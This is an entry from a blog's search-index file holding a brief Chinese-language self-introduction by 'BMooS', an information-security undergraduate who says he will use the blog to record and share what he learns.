    <content><![CDATA[<h1 id="个人介绍—BMooS"><a href="#个人介绍—BMooS" class="headerlink" title="个人介绍—BMooS"></a>个人介绍—BMooS</h1><h2 id="我是谁"><a href="#我是谁" class="headerlink" title="我是谁"></a>我是谁</h2><p>​            </p>
<p>​        我是一名在校学生，男，今年大三，信息安全本科在读。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFN1f.jpg" alt="lXFN1f.jpg"></p>
<h2 id="我要干什么"><a href="#我要干什么" class="headerlink" title="我要干什么"></a>我要干什么</h2><p>​        这是我的博客地址，我会在这里不断记录和分享我的学习内容。</p>
<p><img src="https://s2.ax1x.com/2020/01/15/lXFEkR.png" alt="lXFEkR.png"></p>
<h2 id="未完待续。。。"><a href="#未完待续。。。" class="headerlink" title="未完待续。。。"></a>未完待续。。。</h2>]]></content>
      <categories>
        <category>个人介绍</category>
      </categories>
      <tags>
        <tag>个人介绍</tag>
        <tag>BMooS</tag>
      </tags>
  </entry>
</search>
